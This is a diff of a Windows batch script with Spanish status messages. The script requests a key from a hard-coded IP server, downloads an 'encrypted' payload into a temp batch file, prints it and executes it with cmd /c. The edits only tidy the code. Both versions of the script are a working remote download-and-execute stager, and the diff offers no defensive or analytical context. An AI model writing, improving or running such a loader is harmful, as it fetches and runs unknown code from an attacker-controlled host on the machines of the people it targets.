@@ -7,12 +7,14 @@ set BASE=http://82.29.153.101:8080
 set FILE=%temp%\sc.bat
 
 REM ===== TS =====
-for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
+for /f %%i in ('powershell -NoProfile -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
 echo [DEBUG] TS=%TS%
 
-REM ===== GET KEY =====
+REM ===== KEY =====
 echo [INFO] Requesting KEY...
-for /f "delims=" %%i in ('powershell -NoP -Command "Invoke-RestMethod '%BASE%/auth/key?ts=%TS%'"') do set KEY=%%i
+set URL=%BASE%/auth/key?ts=%TS%
+
+for /f "delims=" %%i in ('powershell -NoProfile -Command "Invoke-RestMethod '%URL%'"') do set KEY=%%i
 
 echo [DEBUG] KEY=%KEY%
 
@@ -21,16 +23,18 @@ if "%KEY%"=="" (
     exit /b 1
 )
 
-REM ===== DOWNLOAD PAYLOAD =====
+REM ===== PAYLOAD =====
 echo [INFO] Downloading payload...
-powershell -NoP -Command "Invoke-WebRequest '%BASE%/payload/encrypted' -Headers @{ 'X-Decrypt-Key'='%KEY%' } -OutFile '%FILE%'"
+
+powershell -NoProfile -Command "Invoke-WebRequest '%BASE%/payload/encrypted' -Headers @{ 'X-Decrypt-Key'='%KEY%' } -OutFile '%FILE%'"
 
 if not exist "%FILE%" (
     echo [ERROR] Payload no descargado
     exit /b 1
 )
 
-for %%A in ("%FILE%") do if %%~zA==0 (
+for %%A in ("%FILE%") do set SIZE=%%~zA
+if %SIZE%==0 (
     echo [ERROR] Payload vacio
     exit /b 1
 )
@@ -38,7 +42,7 @@ for %%A in ("%FILE%") do if %%~zA==0 (
 echo [DEBUG] Payload:
 type "%FILE%"
 
-REM ===== EXECUTE =====
+REM ===== EXEC =====
 echo [INFO] Ejecutando payload...
 cmd /c "%FILE%"
 
